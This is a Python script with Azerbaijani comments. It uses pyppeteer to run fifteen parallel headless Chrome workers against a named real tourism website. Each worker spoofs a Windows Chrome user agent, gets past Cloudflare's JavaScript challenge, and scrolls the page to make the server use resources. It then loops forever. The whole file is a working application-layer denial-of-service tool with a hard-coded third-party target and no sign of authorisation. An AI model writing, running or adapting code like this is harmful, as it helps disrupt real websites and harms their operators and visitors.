import asyncio
import time
from pyppeteer import launch

TARGET = "https://armenia.travel/#"
CONCURRENCY = 15 # Railway RAM-ı az olduğu üçün çox qaldırmayın, 15 kifayətdir

async def attack(id):
    # Brauzeri real Windows Chrome kimi açırıq
    browser = await launch(
        executablePath='/usr/bin/google-chrome', # Railway-də varsa
        args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
        headless=True
    )
    
    while True:
        try:
            page = await browser.newPage()
            # Barmaq izini imitasiya etmək üçün real User-Agent
            await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            # Sayta daxil oluruq - bu an Cloudflare JS Challenge-i həll olunur
            await page.goto(TARGET, {'waitUntil': 'networkidle2', 'timeout': 30000})
            
            # Sayt daxilində ağır bir klik və ya scroll edirik ki, server resurs işlətsin
            await page.evaluate("window.scrollTo(0, document.body.scrollHeight);")
            
            print(f"[Worker-{id}] Cloudflare Geçildi, Serverə yük salınır...")
            
            # Səhifəni bağla və dərhal yenisini aç
            await page.close()
            
        except Exception as e:
            print(f"[Worker-{id}] Cloudflare bloku və ya Error")
            await asyncio.sleep(1)

async def main():
    print(f"[*] Headless Browser Stress Başlayır: {TARGET}")
    tasks = []
    for i in range(CONCURRENCY):
        tasks.append(asyncio.create_task(attack(i)))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
